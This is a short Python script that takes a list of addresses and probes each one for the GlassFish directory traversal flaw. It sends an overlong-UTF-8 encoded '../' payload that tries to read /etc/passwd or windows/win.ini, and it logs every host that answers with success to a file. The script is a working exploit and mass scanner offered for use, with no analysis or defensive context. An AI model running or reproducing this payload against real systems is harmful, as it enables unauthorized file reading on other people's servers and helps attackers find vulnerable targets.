import requests
import time
import sys
def Glassfish_vuln_check() -> object:
    for ip in open(path):
        ip = ip.replace('\n', '')
        payload_linux = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
        payload_windows = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
        try:
            linux_respon = requests.get(ip + payload_linux,timeout=3).status_code
            windows_respon = requests.get(ip + payload_windows,timeout=3).status_code
            print("check->" + ip)
            if linux_respon == 200 or windows_respon == 200:
                with open(r'Glassfish_vuln.txt', 'a+') as f:
                    f.write(ip + '\n')
                    f.close()
            time.sleep(1)
        except Exception as e:
            pass
if __name__ == '__main__':
    path=sys.argv[1]
    Glassfish_vuln_check()